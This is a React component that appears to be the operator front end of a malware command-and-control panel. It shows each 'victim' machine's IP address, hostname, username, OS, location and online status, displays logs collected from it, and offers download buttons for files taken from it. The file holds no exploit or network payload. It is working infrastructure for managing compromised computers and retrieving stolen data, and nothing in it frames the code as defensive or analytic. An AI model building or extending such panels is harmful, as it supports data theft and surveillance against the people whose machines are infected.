import React, { useState, useEffect } from 'react';
import { useParams } from 'react-router-dom';
import axios from 'axios';

function VictimDetail() {
  const { id } = useParams();
  const [victim, setVictim] = useState(null);
  const [loading, setLoading] = useState(true);
  const [activeTab, setActiveTab] = useState('info');

  useEffect(() => {
    fetchVictimDetail();
  }, [id]);

  const fetchVictimDetail = async () => {
    try {
      const response = await axios.get(`/api/victims/${id}`);
      setVictim(response.data);
      setLoading(false);
    } catch (error) {
      console.error('Error fetching victim detail:', error);
    }
  };

  if (loading) return <div className="loading">Loading victim details...</div>;

  return (
    <div>
      <h1>💻 Victim: {victim.victim_id.substring(0, 16)}...</h1>

      <div style={{ margin: '1rem 0' }}>
        <button
          className={`btn ${activeTab === 'info' ? 'btn-primary' : ''}`}
          onClick={() => setActiveTab('info')}
        >
          System Info
        </button>
        <button
          className={`btn ${activeTab === 'logs' ? 'btn-primary' : ''}`}
          onClick={() => setActiveTab('logs')}
        >
          Logs
        </button>
        <button
          className={`btn ${activeTab === 'files' ? 'btn-primary' : ''}`}
          onClick={() => setActiveTab('files')}
        >
          Files
        </button>
      </div>

      {activeTab === 'info' && (
        <div className="table-container">
          <table>
            <tbody>
              <tr><th>Victim ID</th><td>{victim.victim_id}</td></tr>
              <tr><th>IP Address</th><td>{victim.ip_address}</td></tr>
              <tr><th>Hostname</th><td>{victim.hostname}</td></tr>
              <tr><th>Username</th><td>{victim.username}</td></tr>
              <tr><th>OS Version</th><td>{victim.os_version}</td></tr>
              <tr><th>Country</th><td>{victim.country}</td></tr>
              <tr><th>City</th><td>{victim.city}</td></tr>
              <tr><th>First Seen</th><td>{new Date(victim.first_seen).toLocaleString()}</td></tr>
              <tr><th>Last Seen</th><td>{new Date(victim.last_seen).toLocaleString()}</td></tr>
              <tr><th>Status</th>
                <td>
                  <span className={`status-badge ${victim.is_online ? 'online' : 'offline'}`}>
                    {victim.is_online ? 'ONLINE' : 'OFFLINE'}
                  </span>
                </td>
              </tr>
            </tbody>
          </table>
        </div>
      )}

      {activeTab === 'logs' && (
        <div className="table-container">
          <h2>Logs</h2>
          <table>
            <thead>
              <tr>
                <th>Time</th>
                <th>Type</th>
                <th>Content</th>
              </tr>
            </thead>
            <tbody>
              {victim.logs.map((log, i) => (
                <tr key={i}>
                  <td>{new Date(log.created_at).toLocaleString()}</td>
                  <td>{log.type}</td>
                  <td><pre>{log.content}</pre></td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}

      {activeTab === 'files' && (
        <div className="table-container">
          <h2>Files</h2>
          <table>
            <thead>
              <tr>
                <th>Time</th>
                <th>Filename</th>
                <th>Type</th>
                <th>Size</th>
                <th>Action</th>
              </tr>
            </thead>
            <tbody>
              {victim.files.map((file, i) => (
                <tr key={i}>
                  <td>{new Date(file.created_at).toLocaleString()}</td>
                  <td>{file.name}</td>
                  <td>{file.type}</td>
                  <td>{(file.size / 1024).toFixed(2)} KB</td>
                  <td>
                    <a href={`/api/files/${file.id}`} download>
                      <button className="btn btn-primary">Download</button>
                    </a>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}
    </div>
  );
}

export default VictimDetail;